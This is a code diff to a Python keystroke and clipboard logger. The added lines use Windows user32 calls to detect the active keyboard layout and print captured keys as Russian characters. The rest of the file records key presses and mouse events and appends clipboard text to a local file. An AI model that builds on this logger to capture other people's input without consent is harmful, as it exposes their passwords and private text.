@@ -1,18 +1,25 @@
 import keyboard
 import pynput
+import ctypes
 
-from pynput.keyboard import Key
+from pynput.keyboard import Key, KeyCode
 from pynput.mouse import Button
 
 from ClipboardTracker import ClipboardTracker
 from configs.hotkeys import double_hotkeys
+from configs.languages_mapping import english_to_russian_mapping
 
 
 def on_press(key: Key) -> None:
     try:
         print(key.name)
     except AttributeError:
-        print(key)
+        current_language = get_current_language_hash()
+        char_value = getattr(key, 'char', None)
+        if current_language == '0x419':
+            print(english_to_russian_mapping[str(char_value)])
+        else:
+            print(str(char_value))
 
 
 def on_move(x: int, y: int) -> None:
@@ -36,6 +43,15 @@ def on_scroll(x: int, y: int, dx: int, dy: int) -> None:
 def save_clipboard_content(clipboard_content: str, path: str = 'clipboard.txt') -> None:
     with open(path, 'a') as file:
         file.write(clipboard_content + '\n')
+
+
+def get_current_language_hash() -> str:
+    user32 = ctypes.WinDLL('user32.dll', use_last_error=True)
+    current_window = user32.GetForegroundWindow()
+    thread_id = user32.GetWindowThreadProcessId(current_window, 0)
+    klid = user32.GetKeyboardLayout(thread_id)
+    lid = klid & (2 ** 16 - 1)
+    return hex(lid)
 
 
 def main():
